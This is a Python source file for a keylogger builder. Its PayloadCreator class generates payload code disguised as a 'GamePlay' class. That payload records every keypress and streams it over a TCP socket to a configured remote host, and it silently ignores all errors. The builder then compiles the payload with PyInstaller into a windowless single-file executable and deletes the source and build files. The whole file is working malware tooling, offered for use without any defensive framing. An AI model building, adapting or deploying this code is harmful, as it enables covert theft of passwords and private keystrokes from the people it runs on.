import os
import time
import subprocess
import shutil
from pathlib import Path


class PayloadCreator:
    """
    Class responsible for creating and building the keylogger payload executable
    Generates Python source code and compiles it to standalone executable
    """
    
    def __init__(self, config):
        self.config = config  # Reference to configuration object
    
    def get_payload_content(self):
        """
        Generate the payload source code with configured settings
        Returns a string containing the complete Python payload code
        """
        return f"""import socket
import keyboard


class GamePlay:

    def __init__(self,HOST,PORT):
        self.HOST = HOST
        self.PORT = PORT
        self.Client = None
        
    def StartConnection(self):
        try:
            self.Client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            self.Client.connect((self.HOST,self.PORT))
            while True:
                event = keyboard.read_event()
                if event.event_type == "down":
                    self.Client.sendall((event.name.encode()))
        except ConnectionAbortedError:
            pass
        except ConnectionRefusedError:
            pass
        except Exception as e:
            pass
        finally:
            if self.Client:
                self.Client.close()

if __name__ == "__main__":
    game = GamePlay("{self.config.host}",{self.config.port})
    game.StartConnection()
"""
    
    def create_payload(self):
        """
        Main method to create the complete payload executable
        Handles source generation, compilation, and cleanup
        Returns the path to the created executable
        """
        p = Path(self.config.payload_name)
        stem = p.stem 
        exe_suffix = ".exe" if os.name == "nt" else ""
        exe_name = stem + exe_suffix
        
        # Write payload source code to file
        with open(p, "w", buffering=1, encoding="utf-8") as file:
            payload = self.get_payload_content()
            file.write(payload)
        print(f"Payload '{self.config.payload_name}' created successfully!")
        
        # Build executable from source using PyInstaller
        self._build_executable(p, stem, exe_name)
        
        # Clean up temporary build files
        self._cleanup_files(p, stem)
        
        return f"Build succeeded: {exe_name}"
    
    def _build_executable(self, p, stem, exe_name):
        """
        Build executable using PyInstaller
        Compiles Python source to standalone executable with no console window
        """
        print("Building executable...")
        time.sleep(1)
        
        # PyInstaller command to create single-file executable without console
        cmd = ["pyinstaller", "--onefile", "--noconsole", str(p)]
        
        try:
            res = subprocess.run(cmd, capture_output=True, text=True, check=True)
            if res.stdout:
                print(res.stdout)
            if res.stderr:
                print(res.stderr)
        except subprocess.CalledProcessError as e:
            print("PyInstaller failed:", e.returncode)
            if e.stdout:
                print(e.stdout)
            if e.stderr:
                print(e.stderr)
            raise
        
        # Locate the built executable in dist directory
        dist_path = Path("dist") / exe_name
        if not dist_path.exists():
            candidates = list(Path("dist").glob("*"))
            if candidates:
                dist_path = candidates[0]
            else:
                raise FileNotFoundError(f"No build output found in dist/ for {exe_name}")
        
        # Move executable to current working directory
        dest = Path.cwd() / dist_path.name
        try:
            if dest.exists():
                dest.unlink()
            shutil.move(str(dist_path), str(dest))
            print("Moved:", dist_path, "->", dest)
        except Exception as e:
            print("Failed to move exe:", e)
            raise
    
    def _cleanup_files(self, p, stem):
        """
        Remove temporary build files created by PyInstaller
        Cleans up build artifacts to leave only the final executable
        """
        shutil.rmtree("build", ignore_errors=True)
        shutil.rmtree("dist", ignore_errors=True)
        
        try:
            Path(f"{stem}.spec").unlink(missing_ok=True)
        except Exception:
            pass
        
        try:
            p.unlink(missing_ok=True)
            print("Removed source:", p)
        except Exception as e:
            print("Failed to remove source:", e)